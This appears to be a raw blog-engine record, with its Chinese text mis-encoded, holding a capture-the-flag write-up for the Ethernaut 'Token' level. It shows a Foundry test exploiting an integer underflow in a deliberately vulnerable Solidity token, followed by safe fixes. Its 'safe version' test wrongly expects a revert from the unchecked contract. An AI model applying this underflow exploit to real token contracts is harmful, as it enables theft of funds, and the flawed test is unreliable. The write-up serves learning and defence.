**ç†è§£æ•´æ•°æº¢å‡º** - æŒæ¡ç®—æœ¯è¿ç®—çš„å®‰å…¨é—®é¢˜\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### åˆçº¦æºç åˆ†æ\n\n```solidity\npragma solidity ^0.6.0;\n\ncontract Token {\n    mapping(address => uint) balances;\n    uint public totalSupply;\n\n    constructor(uint _initialSupply) public {\n        balances[msg.sender] = totalSupply = _initialSupply;\n    }\n\n    function transfer(address _to, uint _value) public returns (bool) {\n        // ğŸš¨ æ¼æ´ï¼šæ²¡æœ‰æ£€æŸ¥ä¸‹æº¢å‡º\n        require(balances[msg.sender] - _value >= 0);\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        return true;\n    }\n\n    function balanceOf(address _owner) public view returns (uint balance) {\n        return balances[_owner];\n    }\n}\n```\n\n### æ¼æ´è¯†åˆ«\n\n**æ•´æ•°ä¸‹æº¢é—®é¢˜**ï¼š\n\n1. **æ— ç¬¦å·æ•´æ•°ç‰¹æ€§** - `uint` ç±»å‹ä¸èƒ½ä¸ºè´Ÿæ•°\n2. **ä¸‹æº¢è¡Œä¸º** - å½“ `0 - 1` æ—¶ï¼Œç»“æœå˜æˆ `2^256 - 1`\n3. **æ£€æŸ¥å¤±æ•ˆ** - `require(balances[msg.sender] - _value >= 0)` æ€»æ˜¯ä¸ºçœŸ\n\n### æ”»å‡»åŸç†\n\n```solidity\n// å‡è®¾ç”¨æˆ·ä½™é¢ä¸º 20\nuint balance = 20;\nuint transferAmount = 21;\n\n// ä¸‹æº¢è®¡ç®—ï¼š20 - 21 = 2^256 - 1 (å·¨å¤§çš„æ­£æ•°)\nuint result = balance - transferAmount;\n// result = 115792089237316195423570985008687907853269984665640564039457584007913129639935\n\n// require æ£€æŸ¥ï¼šå·¨å¤§çš„æ­£æ•° >= 0ï¼Œæ€»æ˜¯ä¸ºçœŸ\nrequire(result >= 0); // âœ… é€šè¿‡æ£€æŸ¥\n```\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»æµ‹è¯•ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\n// å¤åˆ¶åŸå§‹æœ‰æ¼æ´çš„åˆçº¦ (ä½¿ç”¨ 0.6.0 ç‰ˆæœ¬è¡Œä¸º)\ncontract VulnerableToken {\n    mapping(address => uint) public balances;\n    uint public totalSupply;\n\n    constructor(uint _initialSupply) {\n        balances[msg.sender] = totalSupply = _initialSupply;\n    }\n\n    function transfer(address _to, uint _value) public returns (bool) {\n        // æ•…æ„ä½¿ç”¨ä¸å®‰å…¨çš„ç®—æœ¯è¿ç®—\n        unchecked {\n            require(balances[msg.sender] - _value >= 0);\n            balances[msg.sender] -= _value;\n            balances[_to] += _value;\n        }\n        return true;\n    }\n\n    function balanceOf(address _owner) public view returns (uint balance) {\n        return balances[_owner];\n    }\n}\n\ncontract TokenTest is Test {\n    VulnerableToken public token;\n    \n    address public attacker = makeAddr(\"attacker\");\n    address public victim = makeAddr(\"victim\");\n\n    function setUp() public {\n        // éƒ¨ç½²ä»£å¸åˆçº¦ï¼Œåˆå§‹ä¾›åº”é‡ 1000\n        token = new VulnerableToken(1000);\n        \n        // ç»™æ”»å‡»è€… 20 ä¸ªä»£å¸\n        token.transfer(attacker, 20);\n    }\n\n    function testTokenUnderflowExploit() public {\n        console.log(\"=== æ”»å‡»å‰çŠ¶æ€ ===\");\n        console.log(\"æ”»å‡»è€…ä½™é¢:\", token.balanceOf(attacker));\n        console.log(\"å—å®³è€…ä½™é¢:\", token.balanceOf(victim));\n        \n        vm.startPrank(attacker);\n        \n        // ğŸ¯ å…³é”®æ”»å‡»ï¼šè½¬è´¦è¶…è¿‡ä½™é¢çš„ä»£å¸\n        uint256 transferAmount = 21; // å¤§äº 20 çš„ä½™é¢\n        token.transfer(victim, transferAmount);\n        \n        vm.stopPrank();\n        \n        console.log(\"=== æ”»å‡»åçŠ¶æ€ ===\");\n        console.log(\"æ”»å‡»è€…ä½™é¢:\", token.balanceOf(attacker));\n        console.log(\"å—å®³è€…ä½™é¢:\", token.balanceOf(victim));\n        \n        // éªŒè¯ä¸‹æº¢æ”»å‡»æˆåŠŸ\n        assertGt(token.balanceOf(attacker), 1000000); // æ”»å‡»è€…è·å¾—å·¨é¢ä»£å¸\n        assertEq(token.balanceOf(victim), transferAmount);\n    }\n    \n    function testUnderflowMath() public view {\n        // æ¼”ç¤ºä¸‹æº¢è®¡ç®—\n        uint256 balance = 20;\n        uint256 transferAmount = 21;\n        \n        console.log(\"=== ä¸‹æº¢è®¡ç®—æ¼”ç¤º ===\");\n        console.log(\"åŸå§‹ä½™é¢:\", balance);\n        console.log(\"è½¬è´¦é‡‘é¢:\", transferAmount);\n        \n        unchecked {\n            uint256 result = balance - transferAmount;\n            console.log(\"ä¸‹æº¢ç»“æœ:\", result);\n            console.log(\"æœ€å¤§ uint256:\", type(uint256).max);\n            console.log(\"æ˜¯å¦ç›¸ç­‰:\", result == type(uint256).max);\n        }\n    }\n    \n    function testSafeVersion() public {\n        // æ¼”ç¤ºå®‰å…¨ç‰ˆæœ¬\n        VulnerableToken safeToken = new VulnerableToken(1000);\n        safeToken.transfer(attacker, 20);\n        \n        vm.startPrank(attacker);\n        \n        // åœ¨ Solidity 0.8.0+ ä¸­ï¼Œè¿™ä¼š revert\n        vm.expectRevert(); // æœŸæœ›äº¤æ˜“å¤±è´¥\n        safeToken.transfer(victim, 21); // è¿™åœ¨æ–°ç‰ˆæœ¬ä¸­ä¼šå¤±è´¥\n        \n        vm.stopPrank();\n    }\n}\n```\n\n### è¿è¡Œæµ‹è¯•\n\n```bash\nforge test --match-contract TokenTest -vvv\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### 1. ä½¿ç”¨ Solidity 0.8.0+\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract SafeToken {\n    mapping(address => uint256) public balances;\n    \n    function transfer(address _to, uint256 _value) public returns (bool) {\n        // Solidity 0.8.0+ è‡ªåŠ¨æ£€æŸ¥æº¢å‡º\n        balances[msg.sender] -= _value; // è‡ªåŠ¨ revert å¦‚æœä¸‹æº¢\n        balances[_to] += _value;\n        return true;\n    }\n}\n```\n\n### 2. ä½¿ç”¨ SafeMath åº“ (æ—§ç‰ˆæœ¬)\n\n```solidity\npragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\n\ncontract SafeTokenV6 {\n    using SafeMath for uint256;\n    \n    mapping(address => uint256) public balances;\n    \n    function transfer(address _to, uint256 _value) public returns (bool) {\n        balances[msg.sender] = balances[msg.sender].sub(_value); // å®‰å…¨å‡æ³•\n        balances[_to] = balances[_to].add(_value); // å®‰å…¨åŠ æ³•\n        return true;\n    }\n}\n```\n\n### 3. æ˜¾å¼æ£€æŸ¥\n\n```solidity\ncontract ExplicitCheckToken {\n    mapping(address => uint256) public balances;\n    \n    function transfer(address _to, uint256 _value) public returns (bool) {\n        require(balances[msg.sender] >= _value, \"Insufficient balance\");\n        \n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        return true;\n    }\n}\n```\n\n## ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\n\n### æ•´æ•°æº¢å‡ºç±»å‹\n\n| ç±»å‹ | æè¿° | ç¤ºä¾‹ |\n|------|------|------|\n| **ä¸Šæº¢** | è¶…è¿‡æœ€å¤§å€¼ | `type(uint256).max + 1 = 0` |\n| **ä¸‹æº¢** | ä½äºæœ€å°å€¼ | `0 - 1 = type(uint256).max` |\n\n### Solidity ç‰ˆæœ¬å¯¹æ¯”\n\n```solidity\n// Solidity 0.7.x åŠä»¥ä¸‹\nfunction unsafeAdd(uint a, uint b) public pure returns (uint) {\n    return a + b; // å¯èƒ½æº¢å‡ºï¼Œæ— è‡ªåŠ¨æ£€æŸ¥\n}\n\n// Solidity 0.8.0+\nfunction safeAdd(uint a, uint b) public pure returns (uint) {\n    return a + b; // è‡ªåŠ¨æ£€æŸ¥æº¢å‡ºï¼Œæº¢å‡ºæ—¶ revert\n}\n\n// æ˜¾å¼ä¸å®‰å…¨æ“ä½œ (0.8.0+)\nfunction explicitUnsafe(uint a, uint b) public pure returns (uint) {\n    unchecked {\n        return a + b; // æ˜¾å¼è·³è¿‡æº¢å‡ºæ£€æŸ¥\n    }\n}\n```\n\n### å®‰å…¨æ•°å­¦è¿ç®—\n\n```solidity\n// âœ… å®‰å…¨çš„ä½™é¢æ£€æŸ¥\nfunction safeTransfer(address _to, uint256 _value) public {\n    require(balances[msg.sender] >= _value, \"Insufficient balance\");\n    \n    balances[msg.sender] -= _value;\n    balances[_to] += _value;\n}\n\n// âœ… ä½¿ç”¨ SafeMath (æ—§ç‰ˆæœ¬)\nfunction safeTransferLegacy(address _to, uint256 _value) public {\n    balances[msg.sender] = balances[msg.sender].sub(_value);\n    balances[_to] = balances[_to].add(_value);\n}\n```\n\n## ğŸ›ï¸ å†å²æ¡ˆä¾‹\n\n### è‘—åçš„æ•´æ•°æº¢å‡ºæ”»å‡»\n\n1. **PoWHCoin** (2018)\n   - æ”»å‡»è€…åˆ©ç”¨æ•´æ•°æº¢å‡ºè·å¾—å·¨é¢ä»£å¸\n   - å¯¼è‡´é¡¹ç›®å®Œå…¨å´©æºƒ\n\n2. **BeautyChain (BEC)** (2018)\n   - BatchOverFlow æ¼æ´\n   - é€ æˆä»£å¸ä»·å€¼å½’é›¶\n\n3. **SMT Token** (2018)\n   - ç±»ä¼¼çš„æ‰¹é‡è½¬è´¦æº¢å‡ºæ¼æ´\n   - äº¤æ˜“æ‰€æš‚åœäº¤æ˜“\n\n## ğŸ¯ æ€»ç»“\n\nToken å…³å¡æ­ç¤ºäº†æ—©æœŸ Solidity çš„é‡è¦å®‰å…¨éšæ‚£ï¼š\n\n- âœ… **æ•´æ•°æº¢å‡ºçš„ä¸¥é‡åæœ** - å¯ä»¥å®Œå…¨ç ´åä»£å¸ç»æµå­¦\n- âœ… **ç‰ˆæœ¬å‡çº§çš„é‡è¦æ€§** - Solidity 0.8.0+ æä¾›å†…ç½®ä¿æŠ¤\n- âœ… **SafeMath çš„å†å²ä»·å€¼** - åœ¨æ—§ç‰ˆæœ¬ä¸­æä¾›å®‰å…¨ä¿æŠ¤\n- âœ… **æ˜¾å¼æ£€æŸ¥çš„å¿…è¦æ€§** - æ€»æ˜¯éªŒè¯å…³é”®å‡è®¾\n\nè¿™ä¸ªçœ‹ä¼¼ç®€å•çš„ç®—æœ¯é”™è¯¯ï¼Œå®é™…ä¸Šå½±å“äº†æ— æ•° DeFi é¡¹ç›®çš„å®‰å…¨æ€§è®¾è®¡ã€‚\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ä¸Šä¸€å…³: Level 4 - Telephone](/2025/01/25/ethernaut-level-04-telephone/)**\n- **[ä¸‹ä¸€å…³: Level 6 - Delegation](/2025/01/25/ethernaut-level-06-delegation/)**\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[OpenZeppelin SafeMath](https://docs.openzeppelin.com/contracts/2.x/api/math)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**","source":"_posts/ethernaut-level-05-token.md","raw":"---\ntitle: 'Ethernaut Level 5: Token - æ•´æ•°ä¸‹æº¢æ”»å‡»è¯¦è§£'\ndate: 2025-01-25 15:10:00\nupdated: 2025-01-25 15:10:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - åŸºç¡€æ”»å‡»ç¯‡ (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - æ•´æ•°ä¸‹æº¢\n  - ç®—æœ¯æº¢å‡º\n  - SafeMath\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"æ·±å…¥å­¦ä¹ æ•´æ•°ä¸‹æº¢æ”»å‡»çš„åŸç†å’Œå±å®³ï¼Œäº†è§£ SafeMath åº“çš„é‡è¦æ€§å’Œç°ä»£ Solidity çš„å†…ç½®ä¿æŠ¤æœºåˆ¶ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 5: Token - æ•´æ•°ä¸‹æº¢æ”»å‡»è¯¦è§£\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 5 - Token](https://ethernaut.openzeppelin.com/level/5)  \n> **æ”»å‡»ç±»å‹**: æ•´æ•°ä¸‹æº¢æ”»å‡»  \n> **éš¾åº¦**: â­â­â­â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\n1. **è·å¾—å¤§é‡ä»£å¸** - ä»åˆå§‹çš„ 20 ä¸ªä»£å¸å¢åŠ åˆ°å¤§é‡ä»£å¸\n2. **ç†è§£æ•´æ•°æº¢å‡º** - æŒæ¡ç®—æœ¯è¿ç®—çš„å®‰å…¨é—®é¢˜\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### åˆçº¦æºç åˆ†æ\n\n```solidity\npragma solidity ^0.6.0;\n\ncontract Token {\n    mapping(address => uint) balances;\n    uint public totalSupply;\n\n    constructor(uint _initialSupply) public {\n        balances[msg.sender] = totalSupply = _initialSupply;\n    }\n\n    function transfer(address _to, uint _value) public returns (bool) {\n        // ğŸš¨ æ¼æ´ï¼šæ²¡æœ‰æ£€æŸ¥ä¸‹æº¢å‡º\n        require(balances[msg.sender] - _value >= 0);\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        return true;\n    }\n\n    function balanceOf(address _owner) public view returns (uint balance) {\n        return balances[_owner];\n    }\n}\n```\n\n### æ¼æ´è¯†åˆ«\n\n**æ•´æ•°ä¸‹æº¢é—®é¢˜**ï¼š\n\n1. **æ— ç¬¦å·æ•´æ•°ç‰¹æ€§** - `uint` ç±»å‹ä¸èƒ½ä¸ºè´Ÿæ•°\n2. **ä¸‹æº¢è¡Œä¸º** - å½“ `0 - 1` æ—¶ï¼Œç»“æœå˜æˆ `2^256 - 1`\n3. **æ£€æŸ¥å¤±æ•ˆ** - `require(balances[msg.sender] - _value >= 0)` æ€»æ˜¯ä¸ºçœŸ\n\n### æ”»å‡»åŸç†\n\n```solidity\n// å‡è®¾ç”¨æˆ·ä½™é¢ä¸º 20\nuint balance = 20;\nuint transferAmount = 21;\n\n// ä¸‹æº¢è®¡ç®—ï¼š20 - 21 = 2^256 - 1 (å·¨å¤§çš„æ­£æ•°)\nuint result = balance - transferAmount;\n// result = 115792089237316195423570985008687907853269984665640564039457584007913129639935\n\n// require æ£€æŸ¥ï¼šå·¨å¤§çš„æ­£æ•° >= 0ï¼Œæ€»æ˜¯ä¸ºçœŸ\nrequire(result >= 0); // âœ… é€šè¿‡æ£€æŸ¥\n```\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»æµ‹è¯•ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\n// å¤åˆ¶åŸå§‹æœ‰æ¼æ´çš„åˆçº¦ (ä½¿ç”¨ 0.6.0 ç‰ˆæœ¬è¡Œä¸º)\ncontract VulnerableToken {\n    mapping(address => uint) public balances;\n    uint public totalSupply;\n\n    constructor(uint _initialSupply) {\n        balances[msg.sender] = totalSupply = _initialSupply;\n    }\n\n    function transfer(address _to, uint _value) public returns (bool) {\n        // æ•…æ„ä½¿ç”¨ä¸å®‰å…¨çš„ç®—æœ¯è¿ç®—\n        unchecked {\n            require(balances[msg.sender] - _value >= 0);\n            balances[msg.sender] -= _value;\n            balances[_to] += _value;\n        }\n        return true;\n    }\n\n    function balanceOf(address _owner) public view returns (uint balance) {\n        return balances[_owner];\n    }\n}\n\ncontract TokenTest is Test {\n    VulnerableToken public token;\n    \n    address public attacker = makeAddr(\"attacker\");\n    address public victim = makeAddr(\"victim\");\n\n    function setUp() public {\n        // éƒ¨ç½²ä»£å¸åˆçº¦ï¼Œåˆå§‹ä¾›åº”é‡ 1000\n        token = new VulnerableToken(1000);\n        \n        // ç»™æ”»å‡»è€… 20 ä¸ªä»£å¸\n        token.transfer(attacker, 20);\n    }\n\n    function testTokenUnderflowExploit() public {\n        console.log(\"=== æ”»å‡»å‰çŠ¶æ€ ===\");\n        console.log(\"æ”»å‡»è€…ä½™é¢:\", token.balanceOf(attacker));\n        console.log(\"å—å®³è€…ä½™é¢:\", token.balanceOf(victim));\n        \n        vm.startPrank(attacker);\n        \n        // ğŸ¯ å…³é”®æ”»å‡»ï¼šè½¬è´¦è¶…è¿‡ä½™é¢çš„ä»£å¸\n        uint256 transferAmount = 21; // å¤§äº 20 çš„ä½™é¢\n        token.transfer(victim, transferAmount);\n        \n        vm.stopPrank();\n        \n        console.log(\"=== æ”»å‡»åçŠ¶æ€ ===\");\n        console.log(\"æ”»å‡»è€…ä½™é¢:\", token.balanceOf(attacker));\n        console.log(\"å—å®³è€…ä½™é¢:\", token.balanceOf(victim));\n        \n        // éªŒè¯ä¸‹æº¢æ”»å‡»æˆåŠŸ\n        assertGt(token.balanceOf(attacker), 1000000); // æ”»å‡»è€…è·å¾—å·¨é¢ä»£å¸\n        assertEq(token.balanceOf(victim), transferAmount);\n    }\n    \n    function testUnderflowMath() public view {\n        // æ¼”ç¤ºä¸‹æº¢è®¡ç®—\n        uint256 balance = 20;\n        uint256 transferAmount = 21;\n        \n        console.log(\"=== ä¸‹æº¢è®¡ç®—æ¼”ç¤º ===\");\n        console.log(\"åŸå§‹ä½™é¢:\", balance);\n        console.log(\"è½¬è´¦é‡‘é¢:\", transferAmount);\n        \n        unchecked {\n            uint256 result = balance - transferAmount;\n            console.log(\"ä¸‹æº¢ç»“æœ:\", result);\n            console.log(\"æœ€å¤§ uint256:\", type(uint256).max);\n            console.log(\"æ˜¯å¦ç›¸ç­‰:\", result == type(uint256).max);\n        }\n    }\n    \n    function testSafeVersion() public {\n        // æ¼”ç¤ºå®‰å…¨ç‰ˆæœ¬\n        VulnerableToken safeToken = new VulnerableToken(1000);\n        safeToken.transfer(attacker, 20);\n        \n        vm.startPrank(attacker);\n        \n        // åœ¨ Solidity 0.8.0+ ä¸­ï¼Œè¿™ä¼š revert\n        vm.expectRevert(); // æœŸæœ›äº¤æ˜“å¤±è´¥\n        safeToken.transfer(victim, 21); // è¿™åœ¨æ–°ç‰ˆæœ¬ä¸­ä¼šå¤±è´¥\n        \n        vm.stopPrank();\n    }\n}\n```\n\n### è¿è¡Œæµ‹è¯•\n\n```bash\nforge test --match-contract TokenTest -vvv\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### 1. ä½¿ç”¨ Solidity 0.8.0+\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract SafeToken {\n    mapping(address => uint256) public balances;\n    \n    function transfer(address _to, uint256 _value) public returns (bool) {\n        // Solidity 0.8.0+ è‡ªåŠ¨æ£€æŸ¥æº¢å‡º\n        balances[msg.sender] -= _value; // è‡ªåŠ¨ revert å¦‚æœä¸‹æº¢\n        balances[_to] += _value;\n        return true;\n    }\n}\n```\n\n### 2. ä½¿ç”¨ SafeMath åº“ (æ—§ç‰ˆæœ¬)\n\n```solidity\npragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\n\ncontract SafeTokenV6 {\n    using SafeMath for uint256;\n    \n    mapping(address => uint256) public balances;\n    \n    function transfer(address _to, uint256 _value) public returns (bool) {\n        balances[msg.sender] = balances[msg.sender].sub(_value); // å®‰å…¨å‡æ³•\n        balances[_to] = balances[_to].add(_value); // å®‰å…¨åŠ æ³•\n        return true;\n    }\n}\n```\n\n### 3. æ˜¾å¼æ£€æŸ¥\n\n```solidity\ncontract ExplicitCheckToken {\n    mapping(address => uint256) public balances;\n    \n    function transfer(address _to, uint256 _value) public returns (bool) {\n        require(balances[msg.sender] >= _value, \"Insufficient balance\");\n        \n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        return true;\n    }\n}\n```\n\n## ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\n\n### æ•´æ•°æº¢å‡ºç±»å‹\n\n| ç±»å‹ | æè¿° | ç¤ºä¾‹ |\n|------|------|------|\n| **ä¸Šæº¢** | è¶…è¿‡æœ€å¤§å€¼ | `type(uint256).max + 1 = 0` |\n| **ä¸‹æº¢** | ä½äºæœ€å°å€¼ | `0 - 1 = type(uint256).max` |\n\n### Solidity ç‰ˆæœ¬å¯¹æ¯”\n\n```solidity\n// Solidity 0.7.x åŠä»¥ä¸‹\nfunction unsafeAdd(uint a, uint b) public pure returns (uint) {\n    return a + b; // å¯èƒ½æº¢å‡ºï¼Œæ— è‡ªåŠ¨æ£€æŸ¥\n}\n\n// Solidity 0.8.0+\nfunction safeAdd(uint a, uint b) public pure returns (uint) {\n    return a + b; // è‡ªåŠ¨æ£€æŸ¥æº¢å‡ºï¼Œæº¢å‡ºæ—¶ revert\n}\n\n// æ˜¾å¼ä¸å®‰å…¨æ“ä½œ (0.8.0+)\nfunction explicitUnsafe(uint a, uint b) public pure returns (uint) {\n    unchecked {\n        return a + b; // æ˜¾å¼è·³è¿‡æº¢å‡ºæ£€æŸ¥\n    }\n}\n```\n\n### å®‰å…¨æ•°å­¦è¿ç®—\n\n```solidity\n// âœ… å®‰å…¨çš„ä½™é¢æ£€æŸ¥\nfunction safeTransfer(address _to, uint256 _value) public {\n    require(balances[msg.sender] >= _value, \"Insufficient balance\");\n    \n    balances[msg.sender] -= _value;\n    balances[_to] += _value;\n}\n\n// âœ… ä½¿ç”¨ SafeMath (æ—§ç‰ˆæœ¬)\nfunction safeTransferLegacy(address _to, uint256 _value) public {\n    balances[msg.sender] = balances[msg.sender].sub(_value);\n    balances[_to] = balances[_to].add(_value);\n}\n```\n\n## ğŸ›ï¸ å†å²æ¡ˆä¾‹\n\n### è‘—åçš„æ•´æ•°æº¢å‡ºæ”»å‡»\n\n1. **PoWHCoin** (2018)\n   - æ”»å‡»è€…åˆ©ç”¨æ•´æ•°æº¢å‡ºè·å¾—å·¨é¢ä»£å¸\n   - å¯¼è‡´é¡¹ç›®å®Œå…¨å´©æºƒ\n\n2. **BeautyChain (BEC)** (2018)\n   - BatchOverFlow æ¼æ´\n   - é€ æˆä»£å¸ä»·å€¼å½’é›¶\n\n3. **SMT Token** (2018)\n   - ç±»ä¼¼çš„æ‰¹é‡è½¬è´¦æº¢å‡ºæ¼æ´\n   - äº¤æ˜“æ‰€æš‚åœäº¤æ˜“\n\n## ğŸ¯ æ€»ç»“\n\nToken å…³å¡æ­ç¤ºäº†æ—©æœŸ Solidity çš„é‡è¦å®‰å…¨éšæ‚£ï¼š\n\n- âœ… **æ•´æ•°æº¢å‡ºçš„ä¸¥é‡åæœ** - å¯ä»¥å®Œå…¨ç ´åä»£å¸ç»æµå­¦\n- âœ… **ç‰ˆæœ¬å‡çº§çš„é‡è¦æ€§** - Solidity 0.8.0+ æä¾›å†…ç½®ä¿æŠ¤\n- âœ… **SafeMath çš„å†å²ä»·å€¼** - åœ¨æ—§ç‰ˆæœ¬ä¸­æä¾›å®‰å…¨ä¿æŠ¤\n- âœ… **æ˜¾å¼æ£€æŸ¥çš„å¿…è¦æ€§** - æ€»æ˜¯éªŒè¯å…³é”®å‡è®¾\n\nè¿™ä¸ªçœ‹ä¼¼ç®€å•çš„ç®—æœ¯é”™è¯¯ï¼Œå®é™…ä¸Šå½±å“äº†æ— æ•° DeFi é¡¹ç›®çš„å®‰å…¨æ€§è®¾è®¡ã€‚\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ä¸Šä¸€å…³: Level 4 - Telephone](/2025/01/25/ethernaut-level-04-telephone/)**\n- **[ä¸‹ä¸€å…³: Level 6 - Delegation](/2025/01/25/ethernaut-level-06-delegation/)**\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[OpenZeppelin SafeMath](https://docs.openzeppelin.com/contracts/2.x/api/math)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**","slug":"ethernaut-level-05-token","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbp3000ibf5q6yc88quu","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-5-Token-æ•´æ•°ä¸‹æº¢æ”»å‡»è¯¦è§£\"><a href=\"#ğŸ¯-Ethernaut-Level-5-Token-æ•´æ•°ä¸‹æº¢æ”»å‡»è¯¦è§£\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 5: Token - æ•´æ•°ä¸‹æº¢æ”»å‡»è¯¦è§£\"></a>ğŸ¯ Ethernaut Level 5: Token - æ•´æ•°ä¸‹æº¢æ”»å‡»è¯¦è§£</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/5\">Ethernaut Level 5 - Token</a><br><strong>æ”»å‡»ç±»å‹</strong>: æ•´æ•°ä¸‹æº¢æ”»å‡»<br><strong>éš¾åº¦</strong>: â­â­â­â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><ol>\n<li><strong>è·å¾—å¤§é‡ä»£å¸</strong> - ä»åˆå§‹çš„ 20 ä¸ªä»£å¸å¢åŠ åˆ°å¤§é‡ä»£å¸</li>\n<li><strong>ç†è§£æ•´æ•°æº¢å‡º</strong> - æŒæ¡ç®—æœ¯è¿ç®—çš„å®‰å…¨é—®é¢˜</li>\n</ol>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"åˆçº¦æºç åˆ†æ\"><a href=\"#åˆçº¦æºç åˆ†æ\" class=\"headerlink\" title=\"åˆçº¦æºç åˆ†æ\"></a>åˆçº¦æºç åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.6.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Token &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) balances;</span><br><span class=\"line\">    uint public totalSupply;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(uint _initialSupply) public &#123;</span><br><span class=\"line\">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class=\"line\">        // ğŸš¨ æ¼æ´ï¼šæ²¡æœ‰æ£€æŸ¥ä¸‹æº¢å‡º</span><br><span class=\"line\">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class=\"line\">        balances[msg.sender] -= _value;</span><br><span class=\"line\">        balances[_to] += _value;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class=\"line\">        return balances[_owner];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ¼æ´è¯†åˆ«\"><a href=\"#æ¼æ´è¯†åˆ«\" class=\"headerlink\" title=\"æ¼æ´è¯†åˆ«\"></a>æ¼æ´è¯†åˆ«</h3><p><strong>æ•´æ•°ä¸‹æº¢é—®é¢˜</strong>ï¼š</p>\n<ol>\n<li><strong>æ— ç¬¦å·æ•´æ•°ç‰¹æ€§</strong> - <code>uint</code> ç±»å‹ä¸èƒ½ä¸ºè´Ÿæ•°</li>\n<li><strong>ä¸‹æº¢è¡Œä¸º</strong> - å½“ <code>0 - 1</code> æ—¶ï¼Œç»“æœå˜æˆ <code>2^256 - 1</code></li>\n<li><strong>æ£€æŸ¥å¤±æ•ˆ</strong> - <code>require(balances[msg.sender] - _value &gt;= 0)</code> æ€»æ˜¯ä¸ºçœŸ</li>\n</ol>\n<h3 id=\"æ”»å‡»åŸç†\"><a href=\"#æ”»å‡»åŸç†\" class=\"headerlink\" title=\"æ”»å‡»åŸç†\"></a>æ”»å‡»åŸç†</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// å‡è®¾ç”¨æˆ·ä½™é¢ä¸º 20</span><br><span 